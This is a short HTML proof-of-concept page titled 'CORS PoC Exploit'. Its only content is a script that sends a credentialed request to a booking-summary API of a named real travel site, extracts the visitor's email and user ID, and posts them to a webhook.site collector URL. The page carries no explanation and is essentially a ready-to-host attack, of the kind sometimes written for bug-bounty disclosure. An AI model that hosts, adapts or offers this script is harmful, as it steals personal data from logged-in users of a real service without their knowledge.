<!DOCTYPE html>
<html lang="en">
<head>

    <title>CORS PoC Exploit</title>

<body>
<script>
    fetch('https://supportz.makemytrip.com/api/v4/bookingsummary?pageNo=0&status=ALL&searchValue=&region=in&currency=inr&language=eng', {
        method: 'GET',
        credentials: 'include'
    })
    .then(response => response.json())
    .then(data => {
        const piiData = {
            email: data.userBookingSummary.emailid,
            uuid: data.userBookingSummary.uuid
        };

        fetch('https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(piiData)
        });
    })
    .catch(error => console.error('Error:', error));
</script>
